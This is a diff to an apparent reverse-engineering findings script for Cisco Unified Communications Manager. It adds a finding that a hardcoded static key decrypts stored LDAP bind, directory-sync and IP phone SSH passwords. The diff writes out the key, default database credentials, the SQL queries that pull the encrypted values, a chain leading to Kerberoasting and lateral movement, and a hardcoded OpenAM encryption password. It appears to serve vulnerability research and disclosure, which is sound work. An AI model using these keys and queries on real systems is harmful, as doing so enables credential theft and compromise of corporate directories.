@@ -408,15 +408,30 @@ CUCM-F32 CRITICAL: F3 static key decrypts OAuth JWT signing + encryption keys in
   Downstream: all OAuth-protected CUCM REST APIs, Jabber SSO, Webex integration, UCCX agent sessions
   CVSS: 9.1 Critical AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N
 
+CUCM-F34 HIGH: F3 static key decrypts full credential estate — LDAP bind + phone SSH + DirSync
+  Components: BPS/PhoneDBManager, IMS/AuthenticationLDAP, DirSync/DSLDAPSyncImpl
+  Affected credential tables/columns:
+    ldapauthentication.ldappassword      → IMS AuthenticationLDAP → AD/LDAP bind credential
+    directorypluginconfig.ldappassword   → DirSync DSLDAPSyncImpl → directory sync LDAP bind
+    device.sshpassword                   → BPS PhoneDBManager / RDPDBManager → IP phone SSH passwords
+    authzkeys.keyvalue                   → IMS GetAuthzKeys → OAuth JWT keys (see F32)
+  Bytecode: all use CCMEncryption.hexToByte(hex) → CCMEncryption.decryptPassword([B)
+  Chain:
+    F4 (ccmuser:ccmuser) → SELECT ldappassword FROM ldapauthentication
+    → F3 AES-128-CBC decrypt → plaintext AD bind DN + password
+    → LDAP/AD enum, Kerberoasting, lateral movement
+    F4 → SELECT sshpassword FROM device
+    → F3 decrypt → SSH passwords for all Cisco 7800/8800 series phones
+  CVSS: 8.8 High AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+
 === PENDING TASKS ===
 - ssobackend.jar JWT validation path RE (F6) — CLOSED (SignedJWT.parse blocks alg:none)
 - Nimbus JOSE+JWT CVE mapping for 4.23 build
 - ccm binary: RADIUS integration deeper analysis
 - CTLCli chain finding: F1/F7 RCE → read CallManager_priv.pem → forge signed TFTP configs
-- libCryptoUtil.so from cm-security: hardcoded keys
 """
 
-VERSION = "2.5.0"
+VERSION = "2.6.0"
 
 import requests
 import urllib3
@@ -912,6 +927,49 @@ def check_openam_encryption_key(federation_config_path: str = None) -> dict:
     return {"finding": "CUCM-F33", "severity": "CRITICAL", "evidence": evidence}
 
 
+def check_f3_credential_estate(db_conn=None) -> dict:
+    """CUCM-F34: Verify F3 static key encrypts full credential estate across all subsystems."""
+    F3_KEY = "smetsysocsiccni"
+    evidence = {
+        "finding": "CUCM-F34",
+        "severity": "HIGH",
+        "f3_key": F3_KEY,
+        "credential_stores": [
+            {"table": "ldapauthentication", "column": "ldappassword",
+             "component": "IMS/AuthenticationLDAP",
+             "query": "SELECT ldapdn, ldappassword FROM ldapauthentication",
+             "decrypt": "CCMEncryption.hexToByte(ldappassword) → decryptPassword([B)"},
+            {"table": "directorypluginconfig", "column": "ldappassword",
+             "component": "DirSync/DSLDAPSyncImpl",
+             "query": "SELECT ldapdn, ldappassword FROM directorypluginconfig d, directorypluginhost h WHERE d.pkid=h.fkdirectorypluginconfig",
+             "decrypt": "CCMEncryption.hexToByte → decryptPassword"},
+            {"table": "device", "column": "sshpassword",
+             "component": "BPS/PhoneDBManager + RDPDBManager",
+             "query": "SELECT name, sshpassword FROM device WHERE sshpassword IS NOT NULL",
+             "decrypt": "CCMEncryption.encryptPasswordHex (stored); reverse with decryptPasswordHex"},
+            {"table": "authzkeys", "column": "keyvalue",
+             "component": "IMS/GetAuthzKeys (see F32)",
+             "query": "SELECT keyid, keyvalue, tkpurpose FROM authzkeys",
+             "decrypt": "CCMEncryption.hexToByte → decryptPassword"},
+        ],
+        "chain": (
+            "F4 (ccmuser:ccmuser) → SELECT ldappassword FROM ldapauthentication → "
+            f"CCMEncryption(key={F3_KEY!r}).decryptPassword → plaintext AD bind credentials; "
+            "same key recovers phone SSH passwords from device.sshpassword"
+        ),
+    }
+    if db_conn:
+        try:
+            cur = db_conn.cursor()
+            cur.execute("SELECT COUNT(*) FROM ldapauthentication WHERE ldappassword IS NOT NULL AND ldappassword != ''")
+            evidence["ldap_encrypted_count"] = cur.fetchone()[0]
+            cur.execute("SELECT COUNT(*) FROM device WHERE sshpassword IS NOT NULL AND sshpassword != ''")
+            evidence["phone_ssh_encrypted_count"] = cur.fetchone()[0]
+        except Exception as e:
+            evidence["db_error"] = str(e)
+    return evidence
+
+
 def full_findings_summary() -> str:
     """Return a printable summary of all CUCM RE findings."""
     findings = [
@@ -948,6 +1006,7 @@ def full_findings_summary() -> str:
         ("CUCM-F31", "CRITICAL", "F3 static key decrypts Windows CA service account creds + FIPS SSM PIN from CACredentials.txt → ADCS compromise + lateral movement"),
         ("CUCM-F32", "CRITICAL", "F3 static key decrypts OAuth JWT signing + encryption keys in authzkeys DB table → forge tokens for any CUCM user"),
         ("CUCM-F33", "CRITICAL", "Hardcoded OpenAM am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2 in FederationConfig.properties → decode SAML JKS passphrase → forge SAML for any user"),
+        ("CUCM-F34", "HIGH",     "F3 static key decrypts full credential estate: ldapauthentication.ldappassword (AD bind), device.sshpassword (all phones), directorypluginconfig.ldappassword (DirSync)"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
